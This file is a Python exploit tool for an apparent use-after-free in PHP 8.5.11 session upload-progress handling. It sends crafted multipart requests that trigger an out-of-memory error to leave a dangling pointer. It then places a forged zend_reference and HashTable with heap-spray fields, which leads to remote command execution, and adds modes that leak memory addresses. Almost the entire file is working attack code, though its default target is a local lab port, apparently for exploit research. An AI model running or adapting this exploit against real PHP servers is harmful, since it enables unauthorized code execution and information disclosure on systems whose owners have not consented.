#!/usr/bin/env python3
"""nb_send.py - request builder for the 9bie pure-HTTP chain port (PHP 8.5.11).

Every request is an ordinary multipart/form-data POST to a plain
`<?php echo "OK\n"; ?>` page. No target-side PHP file is planted.

Subcommands
-----------
a            request A of the RCE primitive: session init via
             session.upload_progress FILE_START, then a huge ordinary field
             that OOMs inside php_request_startup (pre-RINIT), leaving
             PS(http_session_vars) dangling for the next request.
leak-a       request A of a Set-Cookie leak: NVARS ordinary fields (to trip
             max_input_vars -> headers_sent when display_errors=On), then
             PHPSESSID = single NUL byte (force new id + send_cookie=1), the
             progress field, a file part and the huge OOM field.
b            request B: pre-RINIT END -> php_session_rfc1867_cleanup ->
             php_session_initialize -> php_session_track_init, which dtors the
             dangling reference. The forged reference is placed by a 55-byte
             multipart raw value buffer; the fake HashTable lives in a live
             167-byte field-value zend_string.
leak-b-num   numeric-key B with per-field 48-char values; optional forge field
             whose 79-byte value (80-byte raw buffer) fakes a zend_string
             header at content offset 0x10.
leak-b-arr   nested-array B (aNNNN[k]) to land real HashTables in a layout.
get          plain GET (worker identity / liveness probe).

All addresses are passed in hex. The local lab endpoint defaults to
127.0.0.1:18130 (published esc-9b-8511 port).
"""
import argparse
import socket
import struct
import sys
import time

DEF_HOST = "127.0.0.1"
DEF_PORT = 18130
DEF_PATH = "/index.php"


# ---------------------------------------------------------------- transport
def send_raw(host, port, path, body, boundary, timeout=40.0):
    if isinstance(boundary, bytes):
        boundary = boundary.decode("latin1")
    hdr = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, port, boundary, len(body))
    ).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    send_err = None
    t0 = time.time()
    try:
        s.sendall(hdr)
        mv = memoryview(body)
        for off in range(0, len(body), 262144):
            try:
                s.sendall(mv[off:off + 262144])
            except OSError as e:  # server side abort is expected at OOM
                send_err = repr(e)
                break
    except OSError as e:
        send_err = repr(e)
    data = bytearray()
    recv_err = None
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError as e:
        recv_err = repr(e)
    finally:
        s.close()
    dt = time.time() - t0
    head, sep, rest = bytes(data).partition(b"\r\n\r\n")
    status = head.split(b"\r\n", 1)[0].decode("latin1", "replace") if head else "<no head>"
    reqlen = len(body)
    return {
        "status": status,
        "bytes": reqlen,
        "resp_bytes": len(data),
        "elapsed": round(dt, 3),
        "send_err": send_err,
        "recv_err": recv_err,
        "raw": bytes(data),
    }


def multipart(parts, boundary):
    o = bytearray()
    for p in parts:
        o += b"--" + boundary + b"\r\n"
        if "filename" in p:
            o += (b'Content-Disposition: form-data; name="' + p["name"] + b'"; filename="'
                  + p["filename"] + b'"\r\nContent-Type: application/octet-stream\r\n\r\n')
        else:
            o += b'Content-Disposition: form-data; name="' + p["name"] + b'"\r\n\r\n'
        o += p["data"] + b"\r\n"
    o += b"--" + boundary + b"--\r\n"
    return bytes(o)


def field(name, data):
    return {"name": name if isinstance(name, bytes) else name.encode(), "data": data}


def filefield(name, filename, data):
    return {"name": name.encode(), "filename": filename.encode(), "data": data}


def summarize(tag, r):
    print("%s status=%r req=%d resp=%d elapsed=%s send_err=%s recv_err=%s"
          % (tag, r["status"], r["bytes"], r["resp_bytes"], r["elapsed"],
             r["send_err"], r["recv_err"]))
    body = r["raw"].split(b"\r\n\r\n", 1)[-1]
    if body:
        print("  body[0:200]=%r" % body[:200])


# ------------------------------------------------------------------ payloads
def build_ht(cmd, htdata, ctor, flags=0x10, mask=0xFFFFFFF8, nts=8):
    """167-byte fake HashTable + execute_data frame (live zend_string data)."""
    L1 = 167
    if len(cmd) > 14:
        raise SystemExit("cmd too long for the 167-byte carrier (max 14 bytes)")
    ht = bytearray(L1)
    struct.pack_into("<II", ht, 0x00, 1, 7)            # gc: refcount=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, flags, mask)     # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)    # arData -> execute_data
    struct.pack_into("<II", ht, 0x18, 1, 1)            # nNumUsed, nNumOfElements
    struct.pack_into("<II", ht, 0x20, nts, 0)          # nTableSize, nInternalPointer
    struct.pack_into("<Q", ht, 0x28, 0)                # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, ctor)             # pDestructor
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x10, ctor)         # return_value / HT pDestructor slot
    struct.pack_into("<I", ht, E + 0x2C, 1)            # ZEND_CALL_NUM_ARGS = 1
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)  # arg1 zval.value
    struct.pack_into("<I", ht, E + 0x58, 6)            # arg1 zval type = IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106)        # fake zend_string gc
    struct.pack_into("<Q", ht, 0x88, 0)                # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))         # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_live_ref(htdata, length=31, ref_type=0x307):
    """A value string whose DATA starts with a fake zend_reference.

    The live zend_string's data address must coincide with PS(http_session_vars)
    (R0); the 24-byte zend_reference lives in the string data and survives until
    request end.
    """
    v = bytearray(b"R" * length)
    struct.pack_into("<Q", v, 0x00, (gc_type_ref() << 32) | 1)
    struct.pack_into("<Q", v, 0x08, htdata)
    struct.pack_into("<I", v, 0x10, ref_type)
    struct.pack_into("<I", v, 0x14, 0)
    return bytes(v)


def gc_type_ref():
    return 10


def build_ref(htdata, ref_type=0x307, value=None, gc_type=10, gc_refcount=1):
    """55-byte value; the 56-byte raw buffer start = R0 - 0x10.

    R0 + 0x00 gc {refcount, IS_REFERENCE}
    R0 + 0x08 val.value
    R0 + 0x10 val.u1.type_info (+u2 zeroed)
    R0 + 0x18 sources
    """
    ref = bytearray(b"X" * 55)
    struct.pack_into("<II", ref, 0x10, gc_refcount, gc_type)
    struct.pack_into("<Q", ref, 0x18, htdata if value is None else value)
    struct.pack_into("<I", ref, 0x20, ref_type)
    struct.pack_into("<I", ref, 0x24, 0)
    struct.pack_into("<Q", ref, 0x28, 0)
    return bytes(ref)


# -------------------------------------------------------------------- modes
def cmd_a(args):
    sidval = b"a" * args.sid_len
    if getattr(args, "sid_zero_first", False) and sidval:
        sidval = b"\x00" + sidval[1:]
    parts = [field("PHPSESSID", sidval),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * args.prog_len)]
    for i, spec in enumerate(args.pads or []):
        nl, vl = spec.split(":")
        nl, vl = int(nl), int(vl)
        nm = ("p%0*d" % (max(0, nl - 1), i))[:nl] if nl > 0 else ""
        parts.append(field(nm, b"V" * vl))
    parts.append(filefield("f", "a.txt", b"A" * 64))
    parts.append(field("big", b"B" * (args.huge * 1024 * 1024)))
    if args.bnd_len:
        boundary = b"S" * args.bnd_len
    else:
        boundary = args.boundary.encode()
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("A", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_leak_a(args):
    parts = []
    for i in range(args.nvars):
        nm = ("f%0*d" % (max(0, args.name_len - 1), i))[:args.name_len] if args.name_len else ""
        parts.append(field(nm, b"x" * max(0, args.val_len)))
    parts.append(field("PHPSESSID", b"\x00"))
    parts.append(field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * args.prog_len))
    parts.append(filefield("f", "a.txt", b"A" * 64))
    parts.append(field("big", b"B" * (args.huge * 1024 * 1024)))
    boundary = b"S" * (args.bnd_len or 17)
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("A-leak", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_b(args):
    cmd = args.cmd.encode()
    ht = build_ht(cmd, args.ht, args.ctor_addr, flags=args.ht_flags, mask=args.mask, nts=args.nts)
    ref = build_ref(args.ht, ref_type=args.ref_type, value=args.ref_value,
                    gc_type=args.gc_type, gc_refcount=args.gc_refcount)
    sid = args.sid.encode() if args.sid_len == 0 else b"a" * args.sid_len
    if args.sid_zero_first and sid:
        sid = b"\x00" + sid[1:]
    parts = [field("PHPSESSID", sid),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(args.mask_n):
        parts.append(field("m%04d" % i, b"M" * args.mask_len))
    for i in range(args.fill_n):
        parts.append(field(("F%030d" % i)[:args.fill_name_len], b"z" * args.fill_val_len))
    live = build_live_ref(args.ht, args.live_len, args.ref_type)
    for i in range(args.live_n):
        parts.append(field("r%04d" % i, live))
    for i in range(args.n1):
        parts.append(field(("a%030d" % i)[:31], ht))
    for i in range(args.n2):
        parts.append(field("f%02d" % i, ref))
    for i in range(args.dummy):
        parts.append(field("d%04d" % i, b"q"))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("B", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_leak_b_num(args):
    parts = [field("PHPSESSID", args.sid.encode()),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(args.n):
        val = (("v%04d" % i) + "x" * 44)[:48]
        parts.append(field(str(1000 + i), val.encode()))
    if args.forge:
        v = bytearray(b"A" * 79)
        struct.pack_into("<Q", v, 0x10, args.leak_len)
        v[0x18] = ord("L")
        parts.append(field("1999", bytes(v)))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("B-leak-num", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_leak_b_arr(args):
    parts = [field("PHPSESSID", args.sid.encode()),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(args.n):
        cnt = args.m if i == args.target else 1
        for j in range(cnt):
            parts.append(field("a%04d[%d]" % (i, j), b"x"))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("B-leak-arr", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_spray(args):
    sidval = b"a" * args.sid_len
    if getattr(args, "sid_zero_first", False) and sidval:
        sidval = b"\x00" + sidval[1:]
    parts = [field("PHPSESSID", sidval),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * args.prog_len)]
    for i in range(args.n):
        pad = ("%05d" % i) + "x" * max(0, args.length - 5)
        parts.append(field("s%04d" % i, pad.encode()[:args.length]))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    r = send_raw(args.host, args.port, args.path, body, boundary, args.timeout)
    summarize("SPRAY", r)
    if args.save:
        open(args.save, "wb").write(r["raw"])
    return r


def cmd_get(args):
    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    s.settimeout(args.timeout)
    s.sendall(("GET %s HTTP/1.0\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
               % (args.path, args.host, args.port)).encode())
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError:
        pass
    s.close()
    head = data.split(b"\r\n\r\n", 1)[0]
    print("GET status=%r resp=%d" % (head.split(b"\r\n", 1)[0].decode("latin1", "replace"), len(data)))
    return {"raw": data}


# --------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default=DEF_HOST)
    ap.add_argument("--port", type=int, default=DEF_PORT)
    ap.add_argument("--path", default=DEF_PATH)
    ap.add_argument("--timeout", type=float, default=40.0)
    ap.add_argument("--save")
    sub = ap.add_subparsers(dest="mode", required=True)

    a = sub.add_parser("a")
    a.add_argument("--bnd-len", type=int, default=17)
    a.add_argument("--boundary", default="S" * 17)
    a.add_argument("--sid-len", type=int, default=19)
    a.add_argument("--sid-zero-first", action="store_true")
    a.add_argument("--prog-len", type=int, default=3)
    a.add_argument("--huge", type=int, default=24, help="OOM field size in MiB")
    a.add_argument("--pads", nargs="*", default=[], help="NAME_LEN:VALUE_LEN")
    a.set_defaults(func=cmd_a)

    la = sub.add_parser("leak-a")
    la.add_argument("--nvars", type=int, default=1001)
    la.add_argument("--name-len", type=int, default=5)
    la.add_argument("--val-len", type=int, default=39)
    la.add_argument("--prog-len", type=int, default=3)
    la.add_argument("--bnd-len", type=int, default=17)
    la.add_argument("--huge", type=int, default=24)
    la.set_defaults(func=cmd_leak_a)

    b = sub.add_parser("b")
    b.add_argument("--n1", type=int, default=15)
    b.add_argument("--n2", type=int, default=2)
    b.add_argument("--ht", type=lambda x: int(x, 0), required=True)
    b.add_argument("--ctor", choices=["zif", "abort", "null"], default="zif")
    b.add_argument("--ctor-addr", type=lambda x: int(x, 0), default=0)
    b.add_argument("--cmd", default="id>/tmp/nb9bm")
    b.add_argument("--ref-type", type=lambda x: int(x, 0), default=0x307)
    b.add_argument("--ref-value", type=lambda x: int(x, 0), default=None)
    b.add_argument("--gc-type", type=lambda x: int(x, 0), default=10)
    b.add_argument("--gc-refcount", type=lambda x: int(x, 0), default=1)
    b.add_argument("--ht-flags", type=lambda x: int(x, 0), default=0x10)
    b.add_argument("--mask", type=lambda x: int(x, 0), default=0xFFFFFFF8)
    b.add_argument("--nts", type=int, default=8)
    b.add_argument("--sid", default="attacksessionid0001")
    b.add_argument("--fill-n", type=int, default=0,
                   help="extra fields whose names consume bin-56 slots before the ref fields")
    b.add_argument("--fill-name-len", type=int, default=31)
    b.add_argument("--fill-val-len", type=int, default=1)
    b.add_argument("--live-n", type=int, default=0,
                   help="live value-string carriers of a fake reference (data at R0)")
    b.add_argument("--live-len", type=int, default=31)
    b.add_argument("--dummy", type=int, default=0,
                   help="extra short fields after the ref fields (max_input_vars warning trigger)")
    b.add_argument("--sid-zero-first", action="store_true")
    b.add_argument("--mask-n", type=int, default=0)
    b.add_argument("--mask-len", type=int, default=100)
    b.add_argument("--sid-len", type=int, default=0,
                   help="if >0, PHPSESSID value = 'a'*len (for bin-matched id masking)")
    b.set_defaults(func=cmd_b)

    bn = sub.add_parser("leak-b-num")
    bn.add_argument("--n", type=int, default=892)
    bn.add_argument("--forge", action="store_true")
    bn.add_argument("--leak-len", type=lambda x: int(x, 0), default=0x1000)
    bn.add_argument("--sid", default="attacksessionid0001")
    bn.set_defaults(func=cmd_leak_b_num)

    ba = sub.add_parser("leak-b-arr")
    ba.add_argument("--target", type=int, default=443)
    ba.add_argument("--m", type=int, default=16)
    ba.add_argument("--n", type=int, default=998)
    ba.add_argument("--sid", default="attacksessionid0001")
    ba.set_defaults(func=cmd_leak_b_arr)

    sp = sub.add_parser("spray")
    sp.add_argument("--n", type=int, default=100)
    sp.add_argument("--length", type=int, default=100)
    sp.add_argument("--sid-len", type=int, default=100)
    sp.add_argument("--prog-len", type=int, default=3)
    sp.set_defaults(func=cmd_spray)

    g = sub.add_parser("get")
    g.set_defaults(func=cmd_get)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
